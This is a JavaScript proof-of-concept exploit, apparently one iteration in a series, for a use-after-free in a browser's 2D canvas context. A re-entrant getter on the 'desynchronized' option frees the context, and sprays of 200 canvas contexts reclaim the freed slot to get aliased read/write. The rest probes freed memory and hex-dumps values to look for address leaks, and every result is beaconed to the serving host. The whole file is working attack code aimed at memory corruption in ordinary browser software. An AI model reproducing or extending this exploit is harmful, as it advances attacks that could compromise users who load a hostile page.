// p484 — Canvas UAF: read from freed-but-mapped memory + double-UAF same-type
//
// V483 CRASHED: AB spray at +32 has invalid ptr → GC visitAdditionalChildren crash
//
// KEY INSIGHT: After UAF, freed slot retains old data (MADV_FREE preserves mappings).
//   The old m_canvas pointer at +32 still points to triggerCanvas (alive in DOM).
//   So BEFORE any spray fills the slot, GC visitAdditionalChildren works because
//   m_canvas is still the valid old pointer.
//
// Strategy:
//   PART A: Second UAF, NO SPRAY, immediate read
//     → Read lineWidth through danglingCtx2 before anything allocates
//     → Should read old default (1.0) from freed-but-mapped memory
//     → This proves we can read from freed slot without crash
//
//   PART B: Second UAF, same-type spray
//     → Spray 200 more contexts to fill second freed slot (GC safe)
//     → Confirm double-UAF aliasing works
//
//   PART C: Use same-type aliased R/W to probe for address leak vectors:
//     → setLineDash with large array → state stack grows → heap buffer allocated
//     → getTransform returns 6 doubles → AffineTransform in State
//     → fillStyle = CanvasGradient → stores RefPtr in State
//     → Read fillStyle back → does it expose gradient address somehow?
//
// Beacon prefix: V484-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V484-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // PART A: First UAF → same-type spray → confirm aliasing (baseline)
  // ═══════════════════════════════════════════════════════════
  var danglingCtx1 = null;
  var liveCtx1 = null;
  var triggerCanvas1 = document.createElement('canvas');
  triggerCanvas1.width = 10;
  triggerCanvas1.height = 10;
  document.body.appendChild(triggerCanvas1);

  var cc1 = 0;
  var s1 = {};
  Object.defineProperty(s1, 'desynchronized', {
    get: function() { cc1++; if (cc1 === 1) danglingCtx1 = triggerCanvas1.getContext('2d'); return false; }
  });
  liveCtx1 = triggerCanvas1.getContext('2d', s1);

  if (!danglingCtx1) { B('ABORT', 'uaf1-fail'); return; }
  B('UAF1', 'ok');

  var N_SPRAY = 200;
  var sprayCanvases1 = [];
  var sprayCtxs1 = [];
  for (var i = 0; i < N_SPRAY; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayCanvases1.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 100 + i;
    sprayCtxs1.push(ctx);
  }

  var lw1 = danglingCtx1.lineWidth;
  if (typeof lw1 !== 'number' || lw1 < 100 || lw1 >= 300) {
    B('UAF1-NOALIAS', 'lw=' + lw1);
    B('DONE'); return;
  }
  var idx1 = Math.round(lw1 - 100);
  B('UAF1-ALIAS', 'idx=' + idx1);

  // ═══════════════════════════════════════════════════════════
  // PART B: Second UAF → NO SPRAY → read freed memory
  //
  // After C1_2 is freed, the 768B slot has old context data.
  // m_canvas at +32 still points to triggerCanvas2 (in DOM).
  // m_stateStack still has the old inline State with default values.
  // Reading lineWidth should return 1.0 (the default).
  // ═══════════════════════════════════════════════════════════
  var danglingCtx2 = null;
  var liveCtx2 = null;
  var triggerCanvas2 = document.createElement('canvas');
  triggerCanvas2.width = 10;
  triggerCanvas2.height = 10;
  document.body.appendChild(triggerCanvas2);

  var cc2 = 0;
  var s2 = {};
  Object.defineProperty(s2, 'desynchronized', {
    get: function() { cc2++; if (cc2 === 1) danglingCtx2 = triggerCanvas2.getContext('2d'); return false; }
  });
  liveCtx2 = triggerCanvas2.getContext('2d', s2);

  if (!danglingCtx2) { B('UAF2-FAIL', 'no ctx'); B('DONE'); return; }
  B('UAF2', 'ok');

  // CRITICAL: Read IMMEDIATELY, no allocations in between
  // The freed slot has old data, m_canvas still valid, m_stateStack still valid
  var freed_lw = -1;
  var freed_ga = -1;
  var freed_ml = -1;
  var freed_err = '';
  try {
    freed_lw = danglingCtx2.lineWidth;
    freed_ga = danglingCtx2.globalAlpha;
    freed_ml = danglingCtx2.miterLimit;
  } catch(e) {
    freed_err = e.message;
  }

  if (freed_err) {
    B('FREED-READ-ERR', freed_err);
  } else {
    B('FREED-READ', 'lw=' + freed_lw + ',ga=' + freed_ga + ',ml=' + freed_ml);
    // Expected: lw=1, ga=1, ml=10 (defaults from the freed context)
    if (freed_lw === 1 && freed_ga === 1 && freed_ml === 10) {
      B('FREED-DEFAULTS', 'YES - reading from freed but mapped memory');
    } else {
      B('FREED-NONDEFAULT', 'something else is in the slot');
    }
  }

  // Try writing through danglingCtx2 to freed memory
  var write_ok = false;
  try {
    danglingCtx2.lineWidth = 31337.75;
    var readback = danglingCtx2.lineWidth;
    write_ok = (readback === 31337.75);
    B('FREED-WRITE', 'wrote=31337.75,read=' + readback + ',ok=' + write_ok);
  } catch(e) {
    B('FREED-WRITE-ERR', e.message);
  }

  // Try save() — increments m_unrealizedSaveCount directly (no indirection)
  try {
    danglingCtx2.save();
    B('FREED-SAVE', 'ok - no crash');
  } catch(e) {
    B('FREED-SAVE-ERR', e.message);
  }

  // Try getTransform — reads 6 doubles from AffineTransform in State
  try {
    var m = danglingCtx2.getTransform();
    B('FREED-TRANSFORM', 'a=' + m.a + ',b=' + m.b + ',c=' + m.c + ',d=' + m.d + ',e=' + m.e + ',f=' + m.f);
  } catch(e) {
    B('FREED-TRANSFORM-ERR', e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // PART C: Now spray same-type into the second freed slot
  // This should reclaim danglingCtx2's slot with a real context
  // ═══════════════════════════════════════════════════════════
  var sprayCanvases2 = [];
  var sprayCtxs2 = [];
  for (var i = 0; i < N_SPRAY; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayCanvases2.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 500 + i;
    sprayCtxs2.push(ctx);
  }

  var lw2 = -1;
  try {
    lw2 = danglingCtx2.lineWidth;
  } catch(e) {
    B('SPRAY2-ERR', e.message);
    B('DONE'); return;
  }

  if (lw2 >= 500 && lw2 < 700) {
    var idx2 = Math.round(lw2 - 500);
    B('UAF2-ALIAS', 'idx=' + idx2);

    // Verify bidirectional
    danglingCtx2.lineWidth = 888.5;
    var check = sprayCtxs2[idx2].lineWidth;
    B('UAF2-BIDIR', 'wrote=888.5,read=' + check + ',ok=' + (check === 888.5));
  } else if (lw2 === 31337.75) {
    B('SPRAY2-MISS', 'still reading our written value - no context filled slot');
  } else {
    B('SPRAY2-UNKNOWN', 'lw=' + lw2);
  }

  // ═══════════════════════════════════════════════════════════
  // PART D: Probe for address leak vectors using UAF1 aliased pair
  // ═══════════════════════════════════════════════════════════

  // D1: Grow state stack → observe if any pointer-like values appear
  // save() many times forces Vector reallocation → m_buffer becomes heap ptr
  // The heap ptr is stored at a fixed offset in the object
  // Can we observe it through any API?
  B('D-STATESTACK', 'growing');
  for (var i = 0; i < 20; i++) {
    sprayCtxs1[idx1].save();
  }
  // After 20 saves, m_stateStack has grown → heap buffer allocated
  // Read through danglingCtx1
  var postSave_lw = danglingCtx1.lineWidth;
  var postSave_ga = danglingCtx1.globalAlpha;
  B('D-POSTSAVE', 'lw=' + postSave_lw + ',ga=' + postSave_ga);

  // D2: Set fillStyle to a CanvasGradient
  try {
    var grad = sprayCtxs1[idx1].createLinearGradient(0, 0, 100, 100);
    grad.addColorStop(0, 'red');
    grad.addColorStop(1, 'blue');
    sprayCtxs1[idx1].fillStyle = grad;

    // Read through dangling
    var fs = danglingCtx1.fillStyle;
    B('D-FILLSTYLE', 'type=' + typeof fs + ',val=' + String(fs).substring(0, 100));
    // If fs is an object (CanvasGradient), we can't get its address
    // But the TYPE of the return is interesting
  } catch(e) {
    B('D-FILLSTYLE-ERR', e.message);
  }

  // D3: setLineDash with values — stores Vector<double> in State
  try {
    sprayCtxs1[idx1].setLineDash([1.1, 2.2, 3.3, 4.4, 5.5]);
    var dash = danglingCtx1.getLineDash();
    B('D-LINEDASH', 'len=' + dash.length + ',vals=' + Array.prototype.join.call(dash, ','));
  } catch(e) {
    B('D-LINEDASH-ERR', e.message);
  }

  // D4: Try to use drawImage between aliased canvases
  // Draw from spray[idx1]'s canvas into triggerCanvas1
  try {
    liveCtx1.drawImage(sprayCanvases1[idx1], 0, 0);
    var imgdata = liveCtx1.getImageData(0, 0, 10, 10);
    var nonzero = 0;
    for (var i = 0; i < imgdata.data.length; i++) {
      if (imgdata.data[i] !== 0) nonzero++;
    }
    B('D-DRAWIMAGE', 'pixels=' + imgdata.data.length + ',nonzero=' + nonzero);
  } catch(e) {
    B('D-DRAWIMAGE-ERR', e.message);
  }

  // D5: Hex dump of all readable doubles through danglingCtx1
  try {
    var hexProps = {};
    var propNames = ['lineWidth', 'globalAlpha', 'miterLimit',
                     'shadowBlur', 'shadowOffsetX', 'shadowOffsetY', 'lineDashOffset'];
    for (var p = 0; p < propNames.length; p++) {
      var val = danglingCtx1[propNames[p]];
      var buf = new ArrayBuffer(8);
      new Float64Array(buf)[0] = val;
      var bytes = new Uint8Array(buf);
      var hex = '';
      for (var b = 7; b >= 0; b--) hex += ('0' + bytes[b].toString(16)).slice(-2);
      hexProps[propNames[p]] = '0x' + hex;
    }
    B('D-HEXDUMP', JSON.stringify(hexProps));
  } catch(e) {
    B('D-HEXDUMP-ERR', e.message);
  }

  // D6: Try getTransform through aliased — 6 doubles from AffineTransform
  // After save() grew the stack, transform might show interesting values
  try {
    var tm = danglingCtx1.getTransform();
    B('D-TRANSFORM', 'a=' + tm.a + ',b=' + tm.b + ',c=' + tm.c + ',d=' + tm.d + ',e=' + tm.e + ',f=' + tm.f);
  } catch(e) {
    B('D-TRANSFORM-ERR', e.message);
  }

  B('SUMMARY', 'uaf1_idx=' + idx1 + ',freed_lw=' + freed_lw + ',lw2=' + lw2);
  B('DONE');
})();
